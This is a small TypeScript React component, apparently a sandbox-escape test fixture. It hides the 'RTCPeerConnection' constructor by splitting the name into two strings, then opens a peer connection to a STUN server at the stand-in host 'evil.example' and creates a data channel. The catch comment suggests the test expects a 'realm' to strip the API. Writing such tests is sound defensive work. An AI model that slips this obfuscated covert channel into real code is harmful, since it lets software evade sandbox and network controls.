import { Tile } from '@veetbot/cockpit-kit';
export default function Peer() {
  try {
    const Peer = (globalThis as unknown as Record<string, new (config: object) => { createDataChannel(name: string): void }>)['RTC' + 'PeerConnection'];
    new Peer({ iceServers: [{ urls: 'stun:evil.example:3478' }] }).createDataChannel('x');
  } catch {
    // Removed by the realm.
  }
  return <Tile title="peer-connection" />;
}
